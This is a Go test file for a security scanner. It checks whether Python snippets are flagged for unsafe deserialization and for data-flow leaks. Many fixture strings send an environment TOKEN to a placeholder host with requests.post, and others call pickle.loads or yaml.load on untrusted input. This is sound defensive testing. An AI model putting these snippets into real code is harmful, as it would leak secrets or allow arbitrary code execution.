//go:build !coreonly && cgo

package scout_test

import (
	"context"
	"errors"
	"testing"

	"github.com/skarm/scout/internal/scantest"
	scenario "github.com/skarm/scout/internal/scantest/scenarios"
)

func TestNativePythonDeserializationAndCalls(t *testing.T) {
	c := scenario.ParserConfig(t)
	c.Scanner.Checks.Patterns = true
	s := scenario.Scanner(t, c)
	for _, tc := range []struct {
		name, text, id string
		want           bool
	}{
		{name: "pickle", text: "import pickle\npickle.loads(b'payload')", id: "PY-AST10", want: true},
		{name: "alias", text: "from pickle import loads as decode\ndecode(input())", id: "PY-TT6", want: true},
		{name: "file", text: "import pickle\nf=open('data','rb')\npickle.loads(f.read())", id: "PY-TT6", want: true},
		{name: "safe-yaml", text: "import yaml\nyaml.load(input(),Loader=yaml.SafeLoader)", id: "PY-AST10", want: false},
		{
			name: "safe-loader-alias",
			text: "from yaml import load,CSafeLoader as Safe\nload(input(),Loader=Safe)",
			id:   "PY-AST10",
			want: false,
		},
		{name: "unsafe-yaml", text: "import yaml\nyaml.load(input())", id: "PY-AST10", want: true},
		{name: "safe-torch", text: "import torch\ntorch.load('data',weights_only=True)", id: "PY-AST10", want: false},
		{name: "unsafe-torch", text: "import torch\ntorch.load('data')", id: "PY-AST10", want: true},
		{name: "safe-numpy", text: "import numpy as np\nnp.load('data')", id: "PY-AST10", want: false},
		{name: "numpy-positional", text: "import numpy as np\nnp.load('data',None,True)", id: "PY-AST10", want: true},
		{
			name: "shadow-pickle",
			text: "import pickle\npickle=object()\npickle.loads(input())",
			id:   "PY-AST10",
			want: false,
		},
		{
			name: "function-sink",
			text: "import requests,os\ndef send(x):\n    requests.post('https://example.invalid',data=x)\nsend(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "lambda-return",
			text: "import requests,os\nf=lambda x:x\nrequests.post('https://example.invalid',data=f(os.getenv('TOKEN')))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "lambda-sink",
			text: "import requests,os\nf=lambda x:requests.post('https://example.invalid',data=x)\nf(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "lambda-default",
			text: "import requests,os\nf=lambda x=os.getenv('TOKEN'):x\nrequests.post('https://example.invalid',data=f())",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "lambda-overwrite",
			text: "import requests,os\nf=lambda x:x\nf=lambda x:'public'\nrequests.post('https://example.invalid',data=f(os.getenv('TOKEN')))",
			id:   "PY-TT3",
			want: false,
		},
		{
			name: "lambda-not-invoked",
			text: "import requests,os\nf=lambda:os.getenv('TOKEN')\nrequests.post('https://example.invalid',data=f)",
			id:   "PY-TT3",
			want: false,
		},
		{
			name: "multiline-body",
			text: "import requests as client\nclient.post(\n endpoint,\n json={'documents': documents},\n timeout=30)\n",
			id:   "NV-E1",
			want: true,
		},
		{
			name: "shadowed-http",
			text: "import requests\nrequests=object()\nrequests.post(url,json=data)",
			id:   "NV-E1",
			want: false,
		},
		{name: "http-comment", text: "# requests.post(url,json=data)\npass", id: "NV-E1", want: false},
		{name: "http-get", text: "import requests\nrequests.get(url)", id: "NV-E1", want: false},

		{
			name: "function-return",
			text: "import requests,os\ndef read():\n    return os.getenv('TOKEN')\nrequests.post('https://example.invalid',data=read())",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "overwritten-function",
			text: "import requests,os\ndef send(x):\n    requests.post('https://example.invalid',data=x)\ndef send(x):\n    return 'safe'\nsend(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: false,
		},
		{
			name: "keyword",
			text: "import requests,os\ndef send(*,data):\n    requests.post('https://example.invalid',data=data)\nsend(data=os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "method",
			text: "import requests,os\nclass C:\n    def send(self,x):\n        requests.post('https://example.invalid',data=x)\nC().send(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "static-method",
			text: "import requests,os\nclass C:\n    @staticmethod\n    def send(x):\n        requests.post('https://example.invalid',data=x)\nC.send(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "inherited-method",
			text: "import requests,os\nclass A:\n    def send(self,x):\n        requests.post('https://example.invalid',data=x)\nclass B(A):\n    pass\nB().send(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "constructor-field",
			text: "import requests,os\nclass C:\n    def __init__(self,x):\n        self.value=x\n    def send(self):\n        requests.post('https://example.invalid',data=self.value)\nc=C(os.getenv('TOKEN'))\nc.send()",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "class-method",
			text: "import requests,os\nclass C:\n    @classmethod\n    def send(cls,x):\n        requests.post('https://example.invalid',data=x)\nC.send(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "super-method",
			text: "import requests,os\nclass A:\n    def send(self,x):\n        requests.post('https://example.invalid',data=x)\nclass B(A):\n    def send(self,x):\n        super().send(x)\nB().send(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "diamond-order",
			text: "import requests,os\nclass A:\n    def send(self,x):\n        requests.post('https://example.invalid',data=x)\nclass B(A):\n    pass\nclass C(A):\n    def send(self,x):\n        return 'public'\nclass D(B,C):\n    pass\nD().send(os.getenv('TOKEN'))",
			id:   "PY-TT3",
			want: false,
		},
		{
			name: "branch-field",
			text: "import requests,os\nclass C:\n    def __init__(self,x):\n        self.value=x\n    def send(self):\n        requests.post('https://example.invalid',data=self.value)\nc=C(os.getenv('TOKEN'))\nif condition:\n    c.value='public'\nc.send()",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "overwrite-field",
			text: "import requests,os\nclass C:\n    def __init__(self,x):\n        self.value=x\n    def send(self):\n        requests.post('https://example.invalid',data=self.value)\nc=C(os.getenv('TOKEN'))\nc.value='public'\nc.send()",
			id:   "PY-TT3",
			want: false,
		},
		{
			name: "closure",
			text: "import requests,os\ndef outer(x):\n    def inner():\n        return x\n    return inner()\nrequests.post('https://example.invalid',data=outer(os.getenv('TOKEN')))",
			id:   "PY-TT3",
			want: true,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), "handler.py", []byte(tc.text))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			if scenario.HasPortRule(r, tc.id) != tc.want {
				t.Fatalf("%s want %v: %+v", tc.id, tc.want, r.Findings)
			}
		})
	}
}

func TestPythonReflectiveLiteralKinds(t *testing.T) {
	s := scenario.Scanner(t, scenario.ParserConfig(t))
	for _, test := range []struct {
		source  string
		dynamic bool
	}{{source: "getattr(obj, 42)", dynamic: true}, {source: "getattr(obj, None)", dynamic: true}, {
		source:  "getattr(obj, 'public_name')",
		dynamic: false,
	}} {
		t.Run(test.source, func(t *testing.T) {
			result, err := s.ScanBytes(context.Background(), "script.py", []byte(test.source))
			if err != nil && !errors.Is(err, scantest.ErrIncomplete) {
				t.Fatal(err)
			}
			if scenario.HasRule(result, "PY-AST7") != test.dynamic {
				t.Fatal("non-string literal was confused with a known string")
			}
		})
	}
}
